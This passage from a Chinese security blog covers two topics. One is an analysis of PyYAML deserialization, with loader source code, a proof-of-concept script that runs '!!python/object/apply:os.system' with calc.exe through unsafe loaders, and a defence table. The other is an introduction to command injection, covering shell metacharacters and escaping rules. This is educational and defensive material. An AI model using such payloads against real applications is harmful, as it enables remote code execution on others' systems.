class="line">    <span class="string">'tag:yaml.org,2002:python/long'</span>,</span><br><span class="line">    Constructor.construct_python_long)</span><br><span class="line"></span><br><span class="line">Constructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/float'</span>,</span><br><span class="line">    Constructor.construct_yaml_float)</span><br><span class="line"></span><br><span class="line">Constructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/complex'</span>,</span><br><span class="line">    Constructor.construct_python_complex)</span><br><span class="line"></span><br><span class="line">Constructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/list'</span>,</span><br><span class="line">    Constructor.construct_yaml_seq)</span><br><span class="line"></span><br><span class="line">Constructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/tuple'</span>,</span><br><span class="line">    Constructor.construct_python_tuple)</span><br><span class="line"></span><br><span class="line">Constructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/dict'</span>,</span><br><span class="line">    Constructor.construct_yaml_map)</span><br><span class="line"></span><br><span class="line">Constructor.add_multi_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/name:'</span>,</span><br><span class="line">    Constructor.construct_python_name)</span><br><span class="line"></span><br><span class="line">Constructor.add_multi_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/module:'</span>,</span><br><span class="line">    Constructor.construct_python_module)</span><br><span class="line"></span><br><span class="line">Constructor.add_multi_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/object:'</span>,</span><br><span class="line">    Constructor.construct_python_object)</span><br><span class="line"></span><br><span class="line">Constructor.add_multi_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/object/apply:'</span>,</span><br><span class="line">    Constructor.construct_python_object_apply)</span><br><span class="line"></span><br><span class="line">Constructor.add_multi_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/object/new:'</span>,</span><br><span class="line">    Constructor.construct_python_object_new)</span><br></pre></td></tr></table></figure>

<p>说明: 加入了很多<code>constructor</code>类型，问题就出现在最后两个</p>
<ul>
<li>获取反序列化中的数据</li>
</ul>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pyyaml)%E6%B5%85%E6%9E%90/7.png" alt></p>
<ul>
<li>获取<code>yaml</code>节点值</li>
</ul>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pyyaml)%E6%B5%85%E6%9E%90/8.png" alt></p>
<ul>
<li>开始构造文档</li>
</ul>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pyyaml)%E6%B5%85%E6%9E%90/9.png" alt></p>
<ul>
<li><code>!!python/object/apply</code>是复杂类型的，这里下一步调用<code>construct_python_object_apply</code>函数</li>
</ul>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pyyaml)%E6%B5%85%E6%9E%90/10.png" alt></p>
<ul>
<li>到这里，生成<code>python</code>实例，触发危险操作</li>
</ul>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pyyaml)%E6%B5%85%E6%9E%90/11.png" alt></p>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pyyaml)%E6%B5%85%E6%9E%90/12.png" alt></p>
<p>后记: 为啥 <code>safe_load</code>函数反序列化就没得问题了？</p>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pyyaml)%E6%B5%85%E6%9E%90/13.png" alt></p>
<ul>
<li>调用<code>safe_load</code>指定<code>SafeLoader</code></li>
<li><code>SafeLoader</code>压根没加入muti的元素，没法反序列化</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_load</span><span class="params">(stream)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Parse the first YAML document in a stream</span></span><br><span class="line"><span class="string">    and produce the corresponding Python object.</span></span><br><span class="line"><span class="string">    Resolve only basic YAML tags.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> load(stream, SafeLoader)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SafeLoader</span><span class="params">(Reader, Scanner, Parser, Composer, SafeConstructor, Resolver)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">        Reader.__init__(self, stream)</span><br><span class="line">        Scanner.__init__(self)</span><br><span class="line">        Parser.__init__(self)</span><br><span class="line">        Composer.__init__(self)</span><br><span class="line">        SafeConstructor.__init__(self)</span><br><span class="line">        Resolver.__init__(self)</span><br><span class="line">        </span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:null'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_null)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:bool'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_bool)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:int'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_int)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:float'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_float)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:binary'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_binary)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:timestamp'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_timestamp)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:omap'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_omap)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:pairs'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_pairs)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:set'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_set)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:str'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_str)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:seq'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_seq)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:map'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_map)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(<span class="literal">None</span>,</span><br><span class="line">        SafeConstructor.construct_undefined)</span><br></pre></td></tr></table></figure>

<h3 id="大于等于5-1的版本"><a href="#大于等于5-1的版本" class="headerlink" title="大于等于5.1的版本"></a>大于等于5.1的版本</h3><p>​    相对于小于5.1的版本，之后的版本官方做到了默认安全，通用的<code>POC</code>默认情况下不起作用</p>
<p>但是考虑到向下兼容的问题，官方有两种方式仍不安全</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> yaml_5_3_1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_old_yaml</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># payload = '!!python/object:__main__.yamlPoc &#123;&#125;'</span></span><br><span class="line">    dump_payload = <span class="string">'!!python/object/apply:os.system ["calc.exe"]'</span></span><br><span class="line">    yaml.safe_load(dump_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_new_yaml</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">'!!python/object/apply:os.system ["calc.exe"]'</span></span><br><span class="line">    dump_payload = <span class="string">'!!python/object/apply:os.system ["calc.exe"]'</span></span><br><span class="line">    <span class="comment"># yaml_5_3_1.load(dump_payload)  # 报错</span></span><br><span class="line"></span><br><span class="line">    yaml_5_3_1.load(dump_payload, Loader=yaml_5_3_1.Loader)  <span class="comment"># 指定不安全的loader 弹计算器</span></span><br><span class="line">    yaml_5_3_1.unsafe_load(dump_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># test_old_yaml()  # 弹计算器</span></span><br><span class="line">    test_new_yaml()  <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pyyaml)%E6%B5%85%E6%9E%90/14.png" alt></p>
<h4 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h4><ul>
<li>默认采用<code>FullLoader</code></li>
</ul>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pyyaml)%E6%B5%85%E6%9E%90/15.png" alt></p>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pyyaml)%E6%B5%85%E6%9E%90/16.png" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">FullConstructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/none'</span>,</span><br><span class="line">    FullConstructor.construct_yaml_null)</span><br><span class="line"></span><br><span class="line">FullConstructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/bool'</span>,</span><br><span class="line">    FullConstructor.construct_yaml_bool)</span><br><span class="line"></span><br><span class="line">FullConstructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/str'</span>,</span><br><span class="line">    FullConstructor.construct_python_str)</span><br><span class="line"></span><br><span class="line">FullConstructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/unicode'</span>,</span><br><span class="line">    FullConstructor.construct_python_unicode)</span><br><span class="line"></span><br><span class="line">FullConstructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/bytes'</span>,</span><br><span class="line">    FullConstructor.construct_python_bytes)</span><br><span class="line"></span><br><span class="line">FullConstructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/int'</span>,</span><br><span class="line">    FullConstructor.construct_yaml_int)</span><br><span class="line"></span><br><span class="line">FullConstructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/long'</span>,</span><br><span class="line">    FullConstructor.construct_python_long)</span><br><span class="line"></span><br><span class="line">FullConstructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/float'</span>,</span><br><span class="line">    FullConstructor.construct_yaml_float)</span><br><span class="line"></span><br><span class="line">FullConstructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/complex'</span>,</span><br><span class="line">    FullConstructor.construct_python_complex)</span><br><span class="line"></span><br><span class="line">FullConstructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/list'</span>,</span><br><span class="line">    FullConstructor.construct_yaml_seq)</span><br><span class="line"></span><br><span class="line">FullConstructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/tuple'</span>,</span><br><span class="line">    FullConstructor.construct_python_tuple)</span><br><span class="line"></span><br><span class="line">FullConstructor.add_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/dict'</span>,</span><br><span class="line">    FullConstructor.construct_yaml_map)</span><br><span class="line"></span><br><span class="line">FullConstructor.add_multi_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/name:'</span>,</span><br><span class="line">    FullConstructor.construct_python_name)</span><br><span class="line"></span><br><span class="line">FullConstructor.add_multi_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/module:'</span>,</span><br><span class="line">    FullConstructor.construct_python_module)</span><br><span class="line"></span><br><span class="line">FullConstructor.add_multi_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/object:'</span>,</span><br><span class="line">    FullConstructor.construct_python_object)</span><br><span class="line"></span><br><span class="line">FullConstructor.add_multi_constructor(</span><br><span class="line">    <span class="string">'tag:yaml.org,2002:python/object/new:'</span>,</span><br><span class="line">    FullConstructor.construct_python_object_new)</span><br></pre></td></tr></table></figure>

<ul>
<li>仍就会add <code>python/object/new:</code>,但是在<code>make_python_instance</code>函数中不会调用系统函数和需要导入的包</li>
</ul>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pyyaml)%E6%B5%85%E6%9E%90/17.png" alt></p>
<ul>
<li><code>safe_loader</code>采取了更加严格的限制</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># safe_loader</span></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:null'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_null)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:bool'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_bool)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:int'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_int)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:float'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_float)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:binary'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_binary)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:timestamp'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_timestamp)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:omap'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_omap)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:pairs'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_pairs)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:set'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_set)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:str'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_str)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:seq'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_seq)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(</span><br><span class="line">        <span class="string">'tag:yaml.org,2002:map'</span>,</span><br><span class="line">        SafeConstructor.construct_yaml_map)</span><br><span class="line"></span><br><span class="line">SafeConstructor.add_constructor(<span class="literal">None</span>,</span><br><span class="line">        SafeConstructor.construct_undefined)</span><br></pre></td></tr></table></figure>

<h3 id="safe-load的一些限制"><a href="#safe-load的一些限制" class="headerlink" title="safe_load的一些限制"></a>safe_load的一些限制</h3><p>​    当然业务层面上，我们只能限制基本类型，业务和安全要权衡考虑</p>
<p>如下： 复数类型就GG</p>
<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pyyaml)%E6%B5%85%E6%9E%90/18.png" alt></p>
<h3 id="其它库"><a href="#其它库" class="headerlink" title="其它库"></a>其它库</h3><p>​    一句话， <code>ruamel.yaml</code>的用法和<code>PyYAML</code>基本一样，并且默认支持更新的YAML1.2版本</p>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><table>
<thead>
<tr>
<th>PyYAML</th>
<th>ruamel.yaml</th>
</tr>
</thead>
<tbody><tr>
<td>safe_load()</td>
<td>safe_load()</td>
</tr>
<tr>
<td>safe_load_all()</td>
<td>safe_load_all()</td>
</tr>
<tr>
<td>load(‘data’,Loader=Safeloader)</td>
<td>load(‘data’,Loader=Safeloader)</td>
</tr>
<tr>
<td>safe_dump()</td>
<td>safe_dump()</td>
</tr>
<tr>
<td>safe_dump_all()</td>
<td>safe_dump_all()</td>
</tr>
<tr>
<td>dump(‘data’,Loader=SafeDumper)</td>
<td>dump(‘data’,Loader=SafeDumper)</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>代码注入&amp;&amp;命令注入</title>
    <url>/2020/10/13/blog_formal/security/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5&amp;&amp;%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="代码注入-amp-amp-命令注入"><a href="#代码注入-amp-amp-命令注入" class="headerlink" title="代码注入&amp;&amp;命令注入"></a>代码注入&amp;&amp;命令注入</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    命令注入（Command Injection）即通过易受攻击的应用程序在主机操作系统上执行任意命令</p>
<ul>
<li>当应用程序将不安全的用户提供的数据(表单，cookie，HTTP标头等)传递给系统shell时，可能会发生命令注入攻击</li>
<li>此攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的权限执行</li>
<li>命令注入攻击很可能主要是由于输入验证不足</li>
<li>此攻击与代码注入不同，因为代码注入允许攻击者添加自己的代码，然后由应用程序执行</li>
<li>在命令注入中，攻击者扩展了执行系统命令的应用程序的默认功能，而无需注入代码</li>
<li>危害巨大，基本可以为所欲为</li>
</ul>
<a id="more"></a>

<h2 id="命令注入-amp-amp-代码执行区别"><a href="#命令注入-amp-amp-代码执行区别" class="headerlink" title="命令注入&amp;&amp;代码执行区别"></a>命令注入&amp;&amp;代码执行区别</h2><p>​    任何脚本语言都可以调用操作系统命令，各个脚本语言的实现方式都不一样</p>
<ul>
<li><p>命令执行漏洞是直接调用操作系统命令 如：system(),shell_exec(),exec()和passthru()</p>
</li>
<li><p>代码执行漏洞则是靠执行脚本代码调用操作系统命令  如：eval(),create_function, call_user_func, call_user_func_array</p>
<p>eg：</p>
</li>
<li><p>一句话木马, 执行phpinfo()， phpinfo()就是代码执行(代码执行漏洞则是靠执行脚本代码调用操作系统命令)</p>
</li>
<li><p>执行 <code>id &gt;&gt; /tmp/1</code> 就是命令执行(命令执行漏洞是直接调用操作系统命令)</p>
</li>
</ul>
<h2 id="代码审查方法"><a href="#代码审查方法" class="headerlink" title="代码审查方法"></a>代码审查方法</h2><p>​    人工代码审计的方法有两种:</p>
<ul>
<li>从不可信源开始追踪整个处理流程</li>
<li>从危险函数、操作开始逆推整个流程寻找不可信源</li>
<li>找到从不可信源到危险函数、操作的流程，判断期间是否有安全性校验或处理，如果有则需要细致判断是否是有效地，如果存在安全风险，构造输入进行测试</li>
</ul>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>​    涉及系统命令调用和执行的函数在接收不可信源数据时未做检查过滤，或者可以通过编码及其他替换手段绕过安全限制注入命令串，导致执行攻击指定的命令</p>
<ul>
<li>没有对用户直接输入的数据进行安全性检查或处理就拼接到命令中并执行</li>
<li>对用户直接输入数据的检查存在缺陷，可被绕过</li>
<li>错误的拼接转义后的内容，导致转义无效或产生bug</li>
<li>公共函数中执行命令时没有对拼接内容进行安全性转义导致引用该函数的接口都存在命令注入风险</li>
<li>对从文件、数据库等中获取的数据完全信任，没有进行安全性检查或处理就拼接到命令中并执行，若该数据在写入时是用户可控的则极有可能造成命令注入漏洞(二次注入)</li>
</ul>
<h2 id="安全编码规范"><a href="#安全编码规范" class="headerlink" title="安全编码规范"></a>安全编码规范</h2><ul>
<li>对不可信源进行严格的格式验证（注意：在使用正则校验格式时注意一定要在正则开头和结尾分别含有代表字符串开头结尾的”^” “$”符号）</li>
<li>在拼接命令语句时，对命令中所有包含变量的参数都使用单引号引用，并对参数内的单引号进行转义(<code>&quot;&#39;&quot;</code> =&gt; <code>&quot;&#39;\&#39;&#39;&quot;</code>)</li>
<li>在执行命令时正确地使用安全的命令执行函数/方法去执行命令</li>
</ul>
<h3 id="PHP安全编码规范"><a href="#PHP安全编码规范" class="headerlink" title="PHP安全编码规范"></a>PHP安全编码规范</h3><ul>
<li>escapeshellarg<br>过滤一个字符串参数，原理是给字符串添加单引号，而shell不会解释单引号中的特殊字符。如果字符串中已经有单引号了，那么该函数会分段处理这个字符串，对字符串中的单引号做转义，并以之分段，也就是这种形式’…’\”…’。也可以说，单引号是就近匹配的。这个函数应该用来过滤单个的shell函数的参数</li>
<li>escapeshellcmd<br>该函数应该被用来过滤整个命令字符串（而不是单个参数），转义shell元字符。</li>
<li>注意：使用时先用escapeshellcmd函数过滤，再用escapeshellarg函数过滤，切记顺序不能颠倒(用反导致很多RCE)</li>
</ul>
<h2 id="Linux-Shell"><a href="#Linux-Shell" class="headerlink" title="Linux Shell"></a>Linux Shell</h2><p>​    一些小知识：</p>
<ul>
<li>命令部分和参数部分的解析方式相同，比如e’ch’o 1可以执行成功并输出 1</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/caixin# e'ch'o 1</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<ul>
<li>在没有单双引号引用的情况下，任何字符都可以使用反斜杠转义，比如\e\cho \1\a\ \b可以执行成功并输出1a b</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/caixin# \e\cho \1\a\ \b</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">1a b</span><br></pre></td></tr></table></figure>

<ul>
<li>在单引号引用的情况下，反斜杠不具有任何转义含义，只代表“\”符号本身，想要在单引号引用中转义单引号需要将 ‘ 变为 <code>&#39;\&#39;&#39;</code></li>
<li>使用双引号引用防止命令注入时，除了需要过滤或转义双引号，还需要过滤或转义反点号（`），转义方法为在前面添加反斜杠</li>
<li>使用双引号引用时，反斜杠只有在其后的字符需要转义时才表示转义，否则也只代表“\”符号本身，比如 echo “1\a”会输出1\a</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/caixin# echo '\'</span><br><span class="line">\</span><br><span class="line">root@kali:/home/caixin# echo "\"</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> ^C</span></span><br><span class="line">root@kali:/home/caixin# echo '\''</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> ^C</span></span><br><span class="line">root@kali:/home/caixin# echo '\a'                                                                                                                                                                           </span><br><span class="line">\a                                                                                                                                                                                                          </span><br><span class="line">root@kali:/home/caixin# echo '\n'                                                                                                                                                                          </span><br><span class="line">\n                                                                                                                                                                                                          </span><br><span class="line">root@kali:/home/caixin# echo "\a"</span><br><span class="line">\a                                                                                                                                                                                                          </span><br><span class="line">root@kali:/home/caixin# echo "\n"                                                                                                                                                                          </span><br><span class="line">\n</span><br></pre></td></tr></table></figure>

<ul>
<li>当不清楚对参数的处理后Shell会如何解析的情况下，可以在Shell中将处理后的参数使用“echo 参数”的形式查看分析</li>
</ul>
<h2 id="命令注入的特殊符号"><a href="#命令注入的特殊符号" class="headerlink" title="命令注入的特殊符号"></a>命令注入的特殊符号</h2><h3 id="（管道符）"><a href="#（管道符）" class="headerlink" title="|（管道符）"></a>|（管道符）</h3><p>| 表示管道，上一条命令的输出，作为下一条命令的参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/caixin# ps -ef | grep "python"                                                                                                                                                              </span><br><span class="line">caixin      1044     883  0 03:27 ?        00:00:03 /usr/bin/python3 /usr/bin/blueman-applet                                                                                                                </span><br><span class="line">caixin      1123       1  0 03:27 ?        00:00:01 /usr/bin/python3 /usr/bin/blueman-tray                                                                                                                  </span><br><span class="line">root       60393   42349  0 04:03 pts/2    00:00:00 grep python</span><br></pre></td></tr></table></figure>

<h3 id="（双管道符）"><a href="#（双管道符）" class="headerlink" title="||（双管道符）"></a>||（双管道符）</h3><p>shell在执行某个命令的时候，会返回一个返回值，该返回值保存在shell变量$? 中</p>
<ul>
<li>当 $? == 0 时，表示执行成功</li>
<li>当 $? != 0时，表示执行失败</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/caixin# echo $?                                                           </span><br><span class="line">127                                                        </span><br><span class="line">root@kali:/home/caixin# cat * </span><br><span class="line">......</span><br><span class="line">root@kali:/home/caixin# echo $?</span><br><span class="line">1</span><br><span class="line">root@kali:/home/caixin# id &gt;&gt; 1</span><br><span class="line">root@kali:/home/caixin# echo $?</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<ul>
<li>命令之间使用 || 连接，实现逻辑或的功能</li>
<li>只有在 || 左边的命令返回假（命令返回值 $? != 0），|| 右边的命令才会被执行。和 c 语言中的逻辑或语法功能相同，即实现短路逻辑或操作</li>
<li>只要有一个命令返回真（命令返回值 $? == 0），后面的命令就不会被执行</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/caixin# whiam || id</span><br><span class="line">bash: whiam: command not found</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@kali:/home/caixin# whoami ||id</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h3 id="amp-（and符）"><a href="#amp-（and符）" class="headerlink" title="&amp;（and符）"></a>&amp;（and符）</h3><p>​    用户有时候执行命令要花很长时间，会影响做其他事情。可以将它放在后台执行。后台运行的程序在用户注销后系统还可以继续执行。当要把命令放在后台执行时，在命令的后面加上&amp;</p>
<p>​    使用 jobs + fg 将后台程序放到前台</p>
<h3 id="amp-amp-（双and符）"><a href="#amp-amp-（双and符）" class="headerlink" title="&amp;&amp;（双and符）"></a>&amp;&amp;（双and符）</h3><ul>
<li>命令之间使用 &amp;&amp; 连接，实现逻辑与的功能</li>
<li>只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才会被执行</li>
<li>只要有一个命令返回假（命令返回值 $? != 0），后面的命令就不会被执行</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/caixin# whaim &amp;&amp; id</span><br><span class="line">bash: whaim: command not found</span><br><span class="line">root@kali:/home/caixin# whoami &amp;&amp; id</span><br><span class="line">root</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@kali:/home/caixin# whoami &amp;&amp; id1 &amp;&amp; id</span><br><span class="line">root</span><br><span class="line">bash: id1: command not found</span><br><span class="line">root@kali:/home/caixin# whoami &amp;&amp; id &amp;&amp; id</span><br><span class="line">root</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<h3 id="分号"><a href="#分号" class="headerlink" title=";(分号)"></a>;(分号)</h3><p>​    有几个命令要连续执行时，可以把它们放在一行内，中间用;分开</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# ls;id;whoami</span><br><span class="line">1</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h3 id="（反引号）"><a href="#（反引号）" class="headerlink" title="`（反引号）"></a>`（反引号）</h3><p>​    命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# echo date</span><br><span class="line">date</span><br><span class="line">root@kali:~# echo `date`</span><br><span class="line">Sun 11 Oct 2020 04:20:39 AM EDT</span><br></pre></td></tr></table></figure>

<h3 id="‘（单引号）and-“（双引号）"><a href="#‘（单引号）and-“（双引号）" class="headerlink" title="‘（单引号）and  “（双引号）"></a>‘（单引号）and  “（双引号）</h3><ul>
<li>被单引号括住的内容,将被视为单一字符串。在引号内的变量$符号将会失效，也就是说，将被视作一般符号处理</li>
<li>被双引号括住的内容，将被视为单一字符串，防止通配符的扩展，<strong>但允许变量扩展 ，这点与单引号的处理方式不同</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# echo "$USER"</span><br><span class="line">root</span><br><span class="line">root@kali:~# echo '$USER'</span><br><span class="line"><span class="meta">$</span><span class="bash">USER</span></span><br></pre></td></tr></table></figure>

